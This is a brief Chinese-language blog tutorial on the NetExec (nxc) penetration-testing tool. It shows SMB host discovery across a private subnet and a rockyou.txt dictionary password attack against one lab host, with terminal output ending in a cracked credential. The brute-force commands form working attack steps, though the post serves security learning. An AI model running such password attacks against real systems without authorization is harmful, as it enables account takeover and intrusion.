---
title: "爆破工具之NetExec"
date: 2026-09-18 15:07:32
description: "NeExec（nxc）是一个强大的网络服务利用工具，旨在自动化评估大型网络的安全性。他是CrackMapExec的继承者，支持多种协议（SMB、LDAP、WinRM、MSSQL、RDP、FTP等） 这里拿smb进行测试 使用nxc进行发现smb主机 使用smb协议进行密码爆破 参考：NexExec(nxc) 内网渗透工具基础使用 CN-SEC 中文网"
categories:
  - 网络安全
tags:
  - 渗透测试
  - 工具
  - mazesec
  - 工具技巧
---

NeExec（nxc）是一个强大的网络服务利用工具，旨在自动化评估大型网络的安全性。他是CrackMapExec的继承者，支持多种协议（SMB、LDAP、WinRM、MSSQL、RDP、FTP等）

这里拿smb进行测试

使用nxc进行发现smb主机

```bash
nxc smb 172.16.12.0/24
```

使用smb协议进行密码爆破

```bash
nxc smb 192.168.245.136 -u leaf -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding  
#末尾加上--ignore-pw-decoding参数是因为rockyou.txt默认是Latin的编码，而NetExec在读取文件时默认期望的是UTF-8
```

```bash
┌──(kali1㉿kali)-[~]
└─$ netexec smb 192.168.245.136 -u leaf -p /usr/share/wordlists/rockyou.txt --ignore-pw-decoding
SMB         192.168.245.136 445    ACFUN            [-] ACFUN\leaf:qwerty STATUS_LOGON_FAILURE
SMB         192.168.245.136 445    ACFUN            [-] ACFUN\leaf:111111 STATUS_LOGON_FAILURE
SMB         192.168.245.136 445    ACFUN            [-] ACFUN\leaf:iloveu STATUS_LOGON_FAILURE
SMB         192.168.245.136 445    ACFUN            [-] ACFUN\leaf:000000 STATUS_LOGON_FAILURE
SMB         192.168.245.136 445    ACFUN            [-] ACFUN\leaf:michelle STATUS_LOGON_FAILURE
SMB         192.168.245.136 445    ACFUN            [+] ACFUN\leaf:gothic
```

参考：[NexExec(nxc) 内网渗透工具基础使用 | CN-SEC 中文网](https://cn-sec.com/archives/4481673.html)